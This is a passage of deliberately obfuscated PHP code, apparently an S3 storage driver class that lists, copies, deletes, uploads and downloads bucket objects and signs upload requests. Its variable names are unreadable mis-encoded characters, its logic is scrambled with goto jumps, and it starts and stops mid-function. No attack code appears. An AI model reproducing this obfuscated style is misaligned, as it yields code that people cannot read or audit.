$a◊óæ‘ªâ± === $bˆ∫íúÇ´«[33] ? $F∂ÿºÜ…óÕ : rtrim($a◊óæ‘ªâ±, $bˆ∫íúÇ´«[8]) . $bˆ∫íúÇ´«[8] . $F∂ÿºÜ…óÕ; if ($Fü¨¿É¯‘ﬂ == REPEAT_REPLACE || !$this->exist($bç˘„Íäàı) || $bÎùÉô¯±Ê && $Fü¨¿É¯‘ﬂ != REPEAT_RENAME_FOLDER) { return $F∂ÿºÜ…óÕ; } goto B≈êú‹ä⁄; B≈êú‹ä⁄: if ($Fü¨¿É¯‘ﬂ == REPEAT_SKIP) { return !1; } $bõ’ÃéäœÉ = $bˆ∫íúÇ´«[103] . get_path_ext($F∂ÿºÜ…óÕ); $bõ’ÃéäœÉ = $bõ’ÃéäœÉ == $bˆ∫íúÇ´«[103] || $bÎùÉô¯±Ê ? $bˆ∫íúÇ´«[33] : $bõ’ÃéäœÉ; goto Bâß’ôÏ≤í; Bâß’ôÏ≤í: $Bƒﬂñ›ΩÂ = 1; $C∏¨”Ó“º€ = substr($F∂ÿºÜ…óÕ, 0, strlen($F∂ÿºÜ…óÕ) - strlen($bõ’ÃéäœÉ)); $CÂÛµàÔ¨Ü = $C∏¨”Ó“º€ . "\x28{$Bƒﬂñ›ΩÂ}\51{$bõ’ÃéäœÉ}"; goto f˘÷◊ˆÂ≥Ñ; d◊Áÿ≤±–Û: } public function listAllFiles($AÖƒıÜÈ∆¨, $AÃÒÌÎúàç, $E†¨æ–÷›∑ = array()) { goto c¥Ïïé≈œ–; c¥Ïïé≈œ–: $búñƒ›ÌáÖ =& $_SERVER[Æ¡î¢≠¯™]; if (empty($AÃÒÌÎúàç)) { return array(); } $BÊ˜Ô£¯èÌ = array(); goto d‰∞¨ Á»è; f…¨ÔŸ≤ªæ: foreach (array_unique($BÊ˜Ô£¯èÌ) as $cﬁ§∞»´ΩÕ) { $Cáã∞†€€í = array($búñƒ›ÌáÖ[85] => $this->getPathOuter($búñƒ›ÌáÖ[8] . $AÖƒıÜÈ∆¨ . $búñƒ›ÌáÖ[8] . $cﬁ§∞»´ΩÕ), $búñƒ›ÌáÖ[86] => 1, $búñƒ›ÌáÖ[87] => 0); if (substr($cﬁ§∞»´ΩÕ, -1) != $búñƒ›ÌáÖ[8]) { $Cáã∞†€€í[$búñƒ›ÌáÖ[86]] = 0; $aè∞‹Â¶ÉÃ = $this->getPath($AÖƒıÜÈ∆¨ . $búñƒ›ÌáÖ[8] . $cﬁ§∞»´ΩÕ); $Cáã∞†€€í[$búñƒ›ÌáÖ[87]] = isset($E†¨æ–÷›∑[$aè∞‹Â¶ÉÃ]) ? $E†¨æ–÷›∑[$aè∞‹Â¶ÉÃ] : $this->size($aè∞‹Â¶ÉÃ); } $aáàöÓëÖ¿[] = $Cáã∞†€€í; } return $aáàöÓëÖ¿; goto C¿ØçíŒéˆ; d‰∞¨ Á»è: $AÖƒıÜÈ∆¨ = trim($AÖƒıÜÈ∆¨, $búñƒ›ÌáÖ[8]); foreach ($AÃÒÌÎúàç as $cﬁ§∞»´ΩÕ) { $D∂æ¬ìÆ∂ü = ltrim(substr($cﬁ§∞»´ΩÕ, strlen($AÖƒıÜÈ∆¨)), $búñƒ›ÌáÖ[8]); $BÊ˜Ô£¯èÌ = array_merge($BÊ˜Ô£¯èÌ, $this->slicePath($D∂æ¬ìÆ∂ü)); } $aáàöÓëÖ¿ = array(); goto f…¨ÔŸ≤ªæ; C¿ØçíŒéˆ: } public function slicePath($eÙÃå¡°€ﬂ) { $eÖõåñ˜≥Ë =& $_SERVER[Æ¡î¢≠¯™]; $Fâ±Ÿ∫Èıç = explode($eÖõåñ˜≥Ë[8], trim($eÙÃå¡°€ﬂ, $eÖõåñ˜≥Ë[8])); $dØÚΩú⁄ƒÙ = 0; do { ++$dØÚΩú⁄ƒÙ; $aúëŸßÃﬂ®[] = implode($eÖõåñ˜≥Ë[8], array_slice($Fâ±Ÿ∫Èıç, 0, $dØÚΩú⁄ƒÙ)) . $eÖõåñ˜≥Ë[8]; } while ($dØÚΩú⁄ƒÙ < count($Fâ±Ÿ∫Èıç)); $aúëŸßÃﬂ®[count($Fâ±Ÿ∫Èıç) - 1] = $eÙÃå¡°€ﬂ; return $aúëŸßÃﬂ®; } public function getHost() { $a—‘ÎÏñä∑ =& $_SERVER[Æ¡î¢≠¯™]; $e˜—áô¬∆¨ = parse_url(trim($this->domain, $a—‘ÎÏñä∑[8])); $BÚıõŒ’»À = isset($e˜—áô¬∆¨[$a—‘ÎÏñä∑[175]]) ? $e˜—áô¬∆¨[$a—‘ÎÏñä∑[175]] : http_type(); $aïô›πåÓ™ = isset($e˜—áô¬∆¨[$a—‘ÎÏñä∑[176]]) ? $e˜—áô¬∆¨[$a—‘ÎÏñä∑[176]] : $e˜—áô¬∆¨[$a—‘ÎÏñä∑[85]]; if (isset($e˜—áô¬∆¨[$a—‘ÎÏñä∑[177]])) { $aïô›πåÓ™ .= $a—‘ÎÏñä∑[4] . $e˜—áô¬∆¨[$a—‘ÎÏñä∑[177]]; } return $BÚıõŒ’»À . $a—‘ÎÏñä∑[178] . $aïô›πåÓ™; } public function pathEncode($e≈ë‘ΩæÜ–) { $aÈ†üå’Ùπ =& $_SERVER[Æ¡î¢≠¯™]; return str_replace($aÈ†üå’Ùπ[179], $aÈ†üå’Ùπ[8], rawurlencode($e≈ë‘ΩæÜ–)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($Bπù ≠”›ﬂ) { set_timeout(); require_once SDK_DIR . $_SERVER[Æ¡î¢≠¯™][180]; parent::__construct(); $this->_init($Bπù ≠”›ﬂ); } public function _init($aëü÷∞œÜ˜) { foreach ($aëü÷∞œÜ˜ as $CØΩ„©õ®á => $céá‚Ü’⁄∞) { if (isset($this->{$CØΩ„©õ®á})) { $this->{$CØΩ„©õ®á} = $céá‚Ü’⁄∞; } } $this->endpoint = $aëü÷∞œÜ˜[$_SERVER[Æ¡î¢≠¯™][181]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($AÂãÓè»éã = "\x76\64") { $this->signVer = $AÂãÓè»éã; $this->client->setSignatureVersion($AÂãÓè»éã); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto e≤ˆ≠ø•Ÿù; E»áûŒá÷¯: $Aõ–Ø¿Ç©Í = array($Aö«äµíœ©[187], $Aö«äµíœ©[188], $Aö«äµíœ©[189], $Aö«äµíœ©[190], $Aö«äµíœ©[191]); $b®–√êß≠ = array_diff($Aõ–Ø¿Ç©Í, $dâﬂ◊‡¥é); return empty($b®–√êß≠); goto aìÉÜéê∂˜; Bä∏‘úñ©⁄: if ($E§äµèä∂ﬂ[$Aö«äµíœ©[182]] != $Aö«äµíœ©[183] || $E§äµèä∂ﬂ[$Aö«äµíœ©[184]] != $Aö«äµíœ©[183]) { return !1; } $dâﬂ◊‡¥é = array_map($Aö«äµíœ©[185], $E§äµèä∂ﬂ[$Aö«äµíœ©[186]]); if (!is_array($dâﬂ◊‡¥é)) { $dâﬂ◊‡¥é = array(); } goto E»áûŒá÷¯; e≤ˆ≠ø•Ÿù: $Aö«äµíœ© =& $_SERVER[Æ¡î¢≠¯™]; $E§äµèä∂ﬂ = $this->getBucketCors(); if (!$E§äµèä∂ﬂ || !is_array($E§äµèä∂ﬂ)) { return !1; } goto Bä∏‘úñ©⁄; aìÉÜéê∂˜: } public function mkfile($a˜∏öÇÃˆÍ, $eóÑ›ßÒñœ = '', $Fàµ÷Æ∏ıŒ = REPEAT_RENAME) { $c√õç€ï‘è = $this->setContent($a˜∏öÇÃˆÍ, $eóÑ›ßÒñœ); if ($c√õç€ï‘è !== !1) { return $this->getPathOuter($a˜∏öÇÃˆÍ); } return !1; } public function mkdir($Fãâæôÿœô, $föî“Ñ‹„ß = REPEAT_SKIP) { if (empty($Fãâæôÿœô)) { return !1; } if ($this->_isFolder($Fãâæôÿœô)) { return $this->getPathOuter($Fãâæôÿœô); } $b∆–◊õÈ ≈ = $this->setContent($Fãâæôÿœô, $_SERVER[Æ¡î¢≠¯™][33], !0); if ($b∆–◊õÈ ≈ !== !1) { return $this->getPathOuter($Fãâæôÿœô); } return !1; } public function copyFile($Dˆáß”‚∞ˆ, $A¢ü›ÃŸ ª, $f∏¿âŸí◊– = array()) { $A≈Ç≥äÆå© =& $_SERVER[Æ¡î¢≠¯™]; $Bﬁí≥à”‹¿ = $this->objectMeta($Dˆáß”‚∞ˆ); if (!$Bﬁí≥à”‹¿) { return !1; } if ($Bﬁí≥à”‹¿[$A≈Ç≥äÆå©[87]] <= 1024 * 1024 * 200) { $cµ¿≈—Ê•⁄ = $this->client->copyObject($this->bucket, $Dˆáß”‚∞ˆ, $this->bucket, $A¢ü›ÃŸ ª, $A≈Ç≥äÆå©[192], $f∏¿âŸí◊–); } else { $cµ¿≈—Ê•⁄ = $this->client->multiCopyObject($this->bucket, $Dˆáß”‚∞ˆ, $this->bucket, $A¢ü›ÃŸ ª, $f∏¿âŸí◊–); } $cµ¿≈—Ê•⁄ = $cµ¿≈—Ê•⁄ ? $this->getPathOuter($A¢ü›ÃŸ ª) : !1; return $cµ¿≈—Ê•⁄; } public function moveFile($e‡˘ú€ô…¶, $c·‹‚”£ŸÒ) { if ($this->copyFile($e‡˘ú€ô…¶, $c·‹‚”£ŸÒ)) { $this->delFile($e‡˘ú€ô…¶); return $this->getPathOuter($c·‹‚”£ŸÒ); } return !1; } public function delFile($eêÖô¥¶——) { return $this->client->deleteObject($this->bucket, $eêÖô¥¶——); } public function delFolder($cå≤’∆ÿçª) { goto a√ò™Ñ∏∏≈; f˘©Ìê£ÇÔ: $c»ÚÿíÇ‘˘ = $dï÷ÑÑ…ó™ = 0; $bˆÜçëÖßí = array_chunk(array_keys($D–…Í‘ÑåÆ), 1000); foreach ($bˆÜçëÖßí as $CÜë±œƒ¢Ö) { $c»ÚÿíÇ‘˘++; $dï÷ÑÑ…ó™ += (int) $this->client->deleteObjects($this->bucket, $CÜë±œƒ¢Ö); } goto a’ãÜ∞Èëú; a√ò™Ñ∏∏≈: $dáèÕÁâ™˘ =& $_SERVER[Æ¡î¢≠¯™]; $D–…Í‘ÑåÆ = $this->listObjs($cå≤’∆ÿçª); if (!$D–…Í‘ÑåÆ) { $cå≤’∆ÿçª = trim($cå≤’∆ÿçª, $dáèÕÁâ™˘[8]); if (!empty($cå≤’∆ÿçª)) { $cå≤’∆ÿçª .= $dáèÕÁâ™˘[8]; } return $this->delFile($cå≤’∆ÿçª); } goto f˘©Ìê£ÇÔ; a’ãÜ∞Èëú: return $c»ÚÿíÇ‘˘ === $dï÷ÑÑ…ó™ ? !0 : !1; goto Bæ£ „’——; Bæ£ „’——: } public function rename($CÇ∑Úæå∏Ã, $Bºø≤Î∏˜ì) { return $this->renameObject($CÇ∑Úæå∏Ã, $Bºø≤Î∏˜ì); } public function listPath($Aëß™”ÈáÍ, $bˆÓ¬øˆ‘· = false) { $e¥ªÉïˆ≠π =& $_SERVER[Æ¡î¢≠¯™]; $Bû’ÇÖÿÁ— = $this->listObjs($Aëß™”ÈáÍ, null, null, $e¥ªÉïˆ≠π[8]); $bÜ¯≤à£ÿñ = array($e¥ªÉïˆ≠π[84] => array(), $e¥ªÉïˆ≠π[83] => array()); foreach ($Bû’ÇÖÿÁ— as $c¯ÓæÓÒ¨å => $e Â¯ùÖúú) { if ($c¯ÓæÓÒ¨å == $e¥ªÉïˆ≠π[8]) { continue; } if (isset($e Â¯ùÖúú[$e¥ªÉïˆ≠π[193]])) { $bÜ¯≤à£ÿñ[$e¥ªÉïˆ≠π[84]][] = $this->folderInfo($e Â¯ùÖúú[$e¥ªÉïˆ≠π[193]], $bˆÓ¬øˆ‘·); } else { if (substr($e Â¯ùÖúú[$e¥ªÉïˆ≠π[28]], -1) == $e¥ªÉïˆ≠π[8]) { continue; } $bÜ¯≤à£ÿñ[$e¥ªÉïˆ≠π[83]][] = $this->fileInfo($e Â¯ùÖúú[$e¥ªÉïˆ≠π[28]], $bˆÓ¬øˆ‘·, $e Â¯ùÖúú); } } return $bÜ¯≤à£ÿñ; } private function fileInfo($eòüıÎ‚ëˆ, $a©∏É™ÑÃì = false, $AÛ‹—éæÎÓ = array()) { goto eÖ•Ê”êµ˘; E≈°∆Ù¶äõ: if (empty($AÛ‹—éæÎÓ)) { $AÛ‹—éæÎÓ = $this->objectMeta($eòüıÎ‚ëˆ); if (!$AÛ‹—éæÎÓ) { return $BåÌç‡¶Í≥; } } if (isset($AÛ‹—éæÎÓ[$B–Í÷èè“˘[197]])) { $BåÌç‡¶Í≥[$B–Í÷èè“˘[117]] = $AÛ‹—éæÎÓ[$B–Í÷èè“˘[197]]; } if (isset($AÛ‹—éæÎÓ[$B–Í÷èè“˘[87]])) { $BåÌç‡¶Í≥[$B–Í÷èè“˘[87]] = $AÛ‹—éæÎÓ[$B–Í÷èè“˘[87]]; } goto AµÑÇâ∞¯Ù; AµÑÇâ∞¯Ù: return $BåÌç‡¶Í≥; goto fæœÒ¢ÿ®; eÖ•Ê”êµ˘: $B–Í÷èè“˘ =& $_SERVER[Æ¡î¢≠¯™]; if ($a©∏É™ÑÃì) { return array($B–Í÷èè“˘[28] => $this->pathThis($eòüıÎ‚ëˆ), $B–Í÷èè“˘[85] => $this->getPathOuter($eòüıÎ‚ëˆ), $B–Í÷èè“˘[29] => $B–Í÷èè“˘[174], $B–Í÷èè“˘[167] => $this->ext($eòüıÎ‚ëˆ), $B–Í÷èè“˘[87] => isset($AÛ‹—éæÎÓ[$B–Í÷èè“˘[87]]) ? $AÛ‹—éæÎÓ[$B–Í÷èè“˘[87]] : 0, $B–Í÷èè“˘[194] => 0, $B–Í÷èè“˘[117] => 0, $B–Í÷èè“˘[195] => !0, $B–Í÷èè“˘[196] => !0); } $BåÌç‡¶Í≥ = array($B–Í÷èè“˘[28] => $this->pathThis($eòüıÎ‚ëˆ), $B–Í÷èè“˘[85] => $this->getPathOuter($eòüıÎ‚ëˆ), $B–Í÷èè“˘[29] => $B–Í÷èè“˘[174], $B–Í÷èè“˘[194] => 0, $B–Í÷èè“˘[117] => 0, $B–Í÷èè“˘[87] => 0, $B–Í÷èè“˘[167] => $this->ext($eòüıÎ‚ëˆ), $B–Í÷èè“˘[195] => !0, $B–Í÷èè“˘[196] => !0); goto E≈°∆Ù¶äõ; fæœÒ¢ÿ®: } private function folderInfo($bŸ≈¨´‘Éü, $Eª∞≤Ú˘Ö“ = false) { goto F–îºñÉ∆í; C¢çââá„Ï: if ($bŸ≈¨´‘Éü == $Aπ¢™≈ıﬁª[33]) { return $Cï†∞û„Ñ¥; } $bŸ≈¨´‘Éü = trim($bŸ≈¨´‘Éü, $Aπ¢™≈ıﬁª[8]) . $Aπ¢™≈ıﬁª[8]; $a€œúÆçÁ‹ = $this->objectMeta($bŸ≈¨´‘Éü); goto bíÜÊ±ù¨º; bíÜÊ±ù¨º: if (isset($a€œúÆçÁ‹[$Aπ¢™≈ıﬁª[197]])) { $Cï†∞û„Ñ¥[$Aπ¢™≈ıﬁª[194]] = $a€œúÆçÁ‹[$Aπ¢™≈ıﬁª[197]]; } return $Cï†∞û„Ñ¥; goto CÚ¨‰æı Õ; F–îºñÉ∆í: $Aπ¢™≈ıﬁª =& $_SERVER[Æ¡î¢≠¯™]; if ($Eª∞≤Ú˘Ö“) { return array($Aπ¢™≈ıﬁª[28] => $this->pathThis($bŸ≈¨´‘Éü), $Aπ¢™≈ıﬁª[85] => $this->getPathOuter($Aπ¢™≈ıﬁª[8] . $bŸ≈¨´‘Éü), $Aπ¢™≈ıﬁª[29] => $Aπ¢™≈ıﬁª[86], $Aπ¢™≈ıﬁª[195] => !0, $Aπ¢™≈ıﬁª[196] => !0); } $Cï†∞û„Ñ¥ = array($Aπ¢™≈ıﬁª[28] => $this->pathThis($bŸ≈¨´‘Éü), $Aπ¢™≈ıﬁª[85] => $this->getPathOuter($Aπ¢™≈ıﬁª[8] . $bŸ≈¨´‘Éü), $Aπ¢™≈ıﬁª[29] => $Aπ¢™≈ıﬁª[86], $Aπ¢™≈ıﬁª[194] => 0, $Aπ¢™≈ıﬁª[117] => 0, $Aπ¢™≈ıﬁª[195] => !0, $Aπ¢™≈ıﬁª[196] => !0); goto C¢çââá„Ï; CÚ¨‰æı Õ: } public function listObjs($b·≥¯æ…äÍ, $aﬁÁÆã„øá = null, $EôÑ™•›Õß = null, $eÜ•„ˆº¨Ñ = null) { $eàÙúπœùÒ =& $_SERVER[Æ¡î¢≠¯™]; $b·≥¯æ…äÍ = trim($b·≥¯æ…äÍ, $eàÙúπœùÒ[8]); $Dê“’à¢úÍ = empty($b·≥¯æ…äÍ) ? $eàÙúπœùÒ[33] : $b·≥¯æ…äÍ . $eàÙúπœùÒ[8]; return $this->client->getBucket($this->bucket, $Dê“’à¢úÍ, $aﬁÁÆã„øá, $EôÑ™•›Õß, $eÜ•„ˆº¨Ñ, !0); } public function has($aâí∆´ß⁄á, $f≈Ü–”±»„ = false, $B§¡±û≠ÿô = true) { goto fì≥è—Áåá; fì≥è—Áåá: $E—∂œÌÙù¯ =& $_SERVER[Æ¡î¢≠¯™]; $bã“ú¨—éí = 0; $bœâ§Ç£—º = 0; goto a§åù¨Üùì; BÛê‡◊ìÌ : if ($f≈Ü–”±»„) { return array($E—∂œÌÙù¯[198] => $bã“ú¨—éí, $E—∂œÌÙù¯[199] => $bœâ§Ç£—º); } return !1; goto eÆÁ·„Éµø; a§åù¨Üùì: $aç”—ëÂÎæ = $this->listObjs($aâí∆´ß⁄á, null, null, $E—∂œÌÙù¯[8]); $aç”—ëÂÎæ = is_array($aç”—ëÂÎæ) ? $aç”—ëÂÎæ : array(); foreach ($aç”—ëÂÎæ as $cÓÀ≤ﬂÇ◊é) { if (isset($cÓÀ≤ﬂÇ◊é[$E—∂œÌÙù¯[28]]) && substr($cÓÀ≤ﬂÇ◊é[$E—∂œÌÙù¯[28]], -1) != $E—∂œÌÙù¯[8]) { if (!$f≈Ü–”±»„ && $B§¡±û≠ÿô) { return !0; } $bã“ú¨—éí++; } else { if (isset($cÓÀ≤ﬂÇ◊é[$E—∂œÌÙù¯[193]])) { if (!$f≈Ü–”±»„ && !$B§¡±û≠ÿô) { return !1; } $bœâ§Ç£—º++; } } } goto BÛê‡◊ìÌ ; eÆÁ·„Éµø: } public function listAll($DÁ†ñÆÆ◊œ) { $DŒˆúê∑“Î =& $_SERVER[Æ¡î¢≠¯™]; $Aêû°äàó≤ = $this->listObjs($DÁ†ñÆÆ◊œ); $e˜—¨ﬁﬁ∫Ø = $bπ‘Ó¿…›’ = array(); foreach ($Aêû°äàó≤ as $fø∆Ú¥Æ° => $bÇ‚’›Çïƒ) { $e˜—¨ﬁﬁ∫Ø[] = $bÇ‚’›Çïƒ[$DŒˆúê∑“Î[28]]; $bπ‘Ó¿…›’[$fø∆Ú¥Æ°] = $bÇ‚’›Çïƒ[$DŒˆúê∑“Î[87]]; } return $this->listAllFiles($DÁ†ñÆÆ◊œ, $e˜—¨ﬁﬁ∫Ø, $bπ‘Ó¿…›’); } public function canRead($fÆª≈É¯°à) { $f≥ÍıèáŸ¡ =& $_SERVER[Æ¡î¢≠¯™]; $BÊæô∏åòÔ = $this->client->getAccessControlPolicy($this->bucket, $fÆª≈É¯°à); if (!$BÊæô∏åòÔ) { return !1; } return in_array($BÊæô∏åòÔ, array($f≥ÍıèáŸ¡[200], $f≥ÍıèáŸ¡[201], $f≥ÍıèáŸ¡[202])) ? !0 : !1; } public function canWrite($Fé’Ç∫âëÙ) { $fã∞…‹œ°Ó =& $_SERVER[Æ¡î¢≠¯™]; $còÜôí®íÌ = $this->client->getAccessControlPolicy($this->bucket, $Fé’Ç∫âëÙ); if (!$còÜôí®íÌ) { return !1; } return in_array($còÜôí®íÌ, array($fã∞…‹œ°Ó[200], $fã∞…‹œ°Ó[201])) ? !0 : !1; } public function getContent($e∑–Èû‚„ô) { return $this->client->getObject($this->bucket, $e∑–Èû‚„ô); } public function setContent($bíÔä∫ÜÑ£, $BçÚëïóâ— = '', $Aõ·®çÃºÉ = false) { goto eÍ£∏¶èàæ; Cæ”£Üé…“: $cµõÉÉ‡Û∆ = $this->copyFile($bíÔä∫ÜÑ£, $bíÔä∫ÜÑ£, array($bòâì†‘â’[203] => $cµõÉÉ‡Û∆[$bòâì†‘â’[204]])); return $cµõÉÉ‡Û∆ ? !0 : !1; goto C¶∑¬∑îö¨; aƒ∞éÖ°Ñê: $cµõÉÉ‡Û∆ = $this->client->putObject($BçÚëïóâ—, $this->bucket, $bíÔä∫ÜÑ£, $bòâì†‘â’[192], array(), $b¥µ§ä´Ü¬); if (!$cµõÉÉ‡Û∆) { return !1; } if ($Aõ·®çÃºÉ) { return !0; } goto Cæ”£Üé…“; eÍ£∏¶èàæ: $bòâì†‘â’ =& $_SERVER[Æ¡î¢≠¯™]; $bíÔä∫ÜÑ£ = $Aõ·®çÃºÉ ? trim($bíÔä∫ÜÑ£, $bòâì†‘â’[8]) . $bòâì†‘â’[8] : $bíÔä∫ÜÑ£; $b¥µ§ä´Ü¬ = get_file_mime(get_path_ext($bíÔä∫ÜÑ£)); goto aƒ∞éÖ°Ñê; C¶∑¬∑îö¨: } public function fileSubstr($b‚∂¨∫Ôô≥, $aéÖ£∫åÔæ, $eÌéÃî™Ç) { $bî∞—µÁ‹ˆ = $aéÖ£∫åÔæ + $eÌéÃî™Ç - 1; return $this->client->getObject($this->bucket, $b‚∂¨∫Ôô≥, array($_SERVER[Æ¡î¢≠¯™][205] => "\x62\171\x74\x65\x73\75{$aéÖ£∫åÔæ}\x2d{$bî∞—µÁ‹ˆ}")); } public function upload($F∂⁄»Ÿîá, $Fèﬁ˘À® â, $bÛËÚÜè§∏ = false, $dÃè≠Úò∆® = REPEAT_REPLACE) { $eäÓâôù§Í =& $_SERVER[Æ¡î¢≠¯™]; $e›∆∫ÉûÊ¶ = array($eäÓâôù§Í[203] => @md5_file($Fèﬁ˘À® â)); $CΩù¨∑ò∂ê = array($eäÓâôù§Í[206] => get_file_mime(get_path_ext($F∂⁄»Ÿîá))); if (IO::size($Fèﬁ˘À® â) <= 1024 * 1024 * 200) { $fÉä¨å¢å¿ = $this->client->putObjectFile($Fèﬁ˘À® â, $this->bucket, $F∂⁄»Ÿîá, $eäÓâôù§Í[192], $e›∆∫ÉûÊ¶, $CΩù¨∑ò∂ê); return !empty($fÉä¨å¢å¿) ? $this->getPathOuter($F∂⁄»Ÿîá) : !1; } $DÓ€ı„Ó«÷ = $this->client->multiUploadObject($Fèﬁ˘À® â, $this->bucket, trim($F∂⁄»Ÿîá, $eäÓâôù§Í[8]), $e›∆∫ÉûÊ¶, $CΩù¨∑ò∂ê); return $DÓ€ı„Ó«÷ ? $this->getPathOuter($F∂⁄»Ÿîá) : !1; } public function download($A‘‡ﬁ¯Œ∞Ò, $déÏ∂”—¬È) { if (!@is_dir($this->pathFather($déÏ∂”—¬È)) && !IO::mkdir($this->pathFather($déÏ∂”—¬È))) { return !1; } $bú”ËçË«ß = $this->client->getObject($this->bucket, $A‘‡ﬁ¯Œ∞Ò, array(), $déÏ∂”—¬È); return $bú”ËçË«ß !== !1 ? $déÏ∂”—¬È : !1; } public function link($cÖÒîóë…„, $C∞Ã‘ùê“÷ = array()) { $eÜÆ«œ¥‚” =& $_SERVER[Æ¡î¢≠¯™]; if ($this->signVer == $eÜÆ«œ¥‚”[207]) { return $this->client->getAuthenticatedURL($this->bucket, $cÖÒîóë…„, 3600 * 12, $C∞Ã‘ùê“÷); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($cÖÒîóë…„, $eÜÆ«œ¥‚”[8]), 3600 * 12, $this->region, array(), !0, $C∞Ã‘ùê“÷); } public function fileOut($a¥›§¿Ëëè, $Fƒ˜©ú∂ˆË = false, $C€ÔÖÎºÒâ = false, $d™ÑÊÎÌ‹œ = '') { goto f¶Ë≠™¯ø«; Eñ∏£ø∫πÁ: $FäÉ¯◊õ¡´ = $this->link($a¥›§¿Ëëè, $d›µ‰µ¬êÎ); $this->fileOutLink($FäÉ¯◊õ¡´); goto A‹ØÒïÃù©; fë¶Ø≤Îè¯: if ($BªìººÖıÌ == $dÈúóÁ∫Í—[208]) { return parent::fileOut($a¥›§¿Ëëè, $Fƒ˜©ú∂ˆË, $C€ÔÖÎºÒâ, $d™ÑÊÎÌ‹œ); } $Fƒ˜©ú∂ˆË = $Fƒ˜©ú∂ˆË ? $dÈúóÁ∫Í—[209] : $dÈúóÁ∫Í—[210]; $d›µ‰µ¬êÎ = array($dÈúóÁ∫Í—[211] => $Fƒ˜©ú∂ˆË . $dÈúóÁ∫Í—[212] . rawurlencode($C€ÔÖÎºÒâ), $dÈúóÁ∫Í—[213] => $BªìººÖıÌ); goto Eñ∏£ø∫πÁ; f¶Ë≠™¯ø«: $dÈúóÁ∫Í— =& $_SERVER[Æ¡î¢≠¯™]; if (!$C€ÔÖÎºÒâ) { $C€ÔÖÎºÒâ = $this->pathThis($a¥›§¿Ëëè); } $BªìººÖıÌ = get_file_mime(get_path_ext($C€ÔÖÎºÒâ)); goto fë¶Ø≤Îè¯; A‹ØÒïÃù©: } public function fileOutServer($eŸç˘˜ãí©, $a“√âñÓ≤Ë = false, $a¬«°·ÙÇß = false, $cöÀº¿≠—ﬁ = '') { parent::fileOut($eŸç˘˜ãí©, $a“√âñÓ≤Ë, $a¬«°·ÙÇß, $cöÀº¿≠—ﬁ); } public function fileOutImage($DÀÉ˜”µ‡≠, $bèÈéãó≥ä = 250) { $dâÇ€èÎˆÌ = $this->link($DÀÉ˜”µ‡≠); $this->fileOutLink($dâÇ€èÎˆÌ); } public function fileOutImageServer($dÌ§ÓµΩ©±, $BÓΩÀ∫ô≤â = 250) { parent::fileOutImage($dÌ§ÓµΩ©±, $BÓΩÀ∫ô≤â); } public function hashMd5($fíüŸùå¬…, $FÏ◊≤ã¨ÊŸ = '') { $d¢’â–ŒÕ◊ =& $_SERVER[Æ¡î¢≠¯™]; $aŸ≠€»‘ÇÖ = $this->objectMeta($fíüŸùå¬…); if (!$aŸ≠€»‘ÇÖ) { return !1; } $FÏ◊≤ã¨ÊŸ = $FÏ◊≤ã¨ÊŸ ? $FÏ◊≤ã¨ÊŸ : _get($aŸ≠€»‘ÇÖ, $d¢’â–ŒÕ◊[214]); $FÏ◊≤ã¨ÊŸ = $FÏ◊≤ã¨ÊŸ ? $FÏ◊≤ã¨ÊŸ : _get($aŸ≠€»‘ÇÖ, $d¢’â–ŒÕ◊[204], $d¢’â–ŒÕ◊[33]); return $FÏ◊≤ã¨ÊŸ; } public function uploadFormData($CêƒÇı√ﬂ∂, $Cãﬂπœ‚ÆÙ = 3600) { $bÉÇ÷ºË›Ê =& $_SERVER[Æ¡î¢≠¯™]; $a∑‚È≥íÒﬁ = $this->pathFather($CêƒÇı√ﬂ∂); $a¯‚ñ…Ì∞Ê = $this->client->getHttpUploadPostParams($this->bucket, $a∑‚È≥íÒﬁ, $bÉÇ÷ºË›Ê[192], $Cãﬂπœ‚ÆÙ); return array_merge((array) $a¯‚ñ…Ì∞Ê, array($bÉÇ÷ºË›Ê[176] => $this->getHost())); } public function multiUploadFormData($e≈à‰€§”Ü, $CñÉàÑŒ∞± = 3600) { $E¡Â®Ò¿Úè =& $_SERVER[Æ¡î¢≠¯™]; $fØÑÁàª¡ç = gmdate($E¡Â®Ò¿Úè[215]); $aÉ€∆ñ«±© = array(); $cå™…¢µ§÷ = $this->client->getUploadId($this->bucket, $e≈à‰€§”Ü, $aÉ€∆ñ«±©); if (!$cå™…¢µ§÷) { return !1; } return array($E¡Â®Ò¿Úè[216] => $cå™…¢µ§÷, $E¡Â®Ò¿Úè[176] => $this->getHost() . $E¡Â®Ò¿Úè[8] . $this->pathEncode($e≈à‰€§”Ü), $E¡Â®Ò¿Úè[217] => $fØÑÁàª¡ç, $E¡Â®Ò¿Úè[99] => $e≈à‰€§”Ü); } public function multiUploadAuthData($eΩ›‰§˘ìå, $cíöã¯—È· = array()) { goto Fô˘ﬁ•£•¡; BÇê∆Í¡∂¡: $e∏ê›Ù•‡à = implode($C‰àã∫Ùã[62], $fŸ˜Èòáßˆ); $báÍÙâ“¥ª = base64_encode(hash_hmac($C‰àã∫Ùã[224], $e∏ê›Ù•‡à, $this->secret, !0)); $b”ÖäïË±Œ = $C‰àã∫Ùã[225] . $this->accessKey . $C‰àã∫Ùã[4] . $báÍÙâ“¥ª; goto Dèï¿áÖ∑ß; Dèï¿áÖ∑ß: if (strpos($EÛá‹µ„ú, $C‰àã∫Ùã[220]) === 0) { return array($C‰àã∫Ùã[226] => $b”ÖäïË±Œ, $C‰àã∫Ùã[217] => $eœŸ¥·§Ìã); } return $b”ÖäïË±Œ; goto c‡ºπ»≠ƒÖ; B∆¨©ç®∫«: $fŸ˜Èòáßˆ = array($C‰àã∫Ùã[219], $C‰àã∫Ùã[33], $C‰àã∫Ùã[126], $C‰àã∫Ùã[33], "\x78\55\141\x6d\172\55\144\141\x74\145\72{$eœŸ¥·§Ìã}", $C‰àã∫Ùã[8] . $this->bucket . $C‰àã∫Ùã[8] . $this->pathEncode($e∫⁄Æ®æË≠) . $EÛá‹µ„ú); if (strpos($EÛá‹µ„ú, $C‰àã∫Ùã[220]) === 0) { 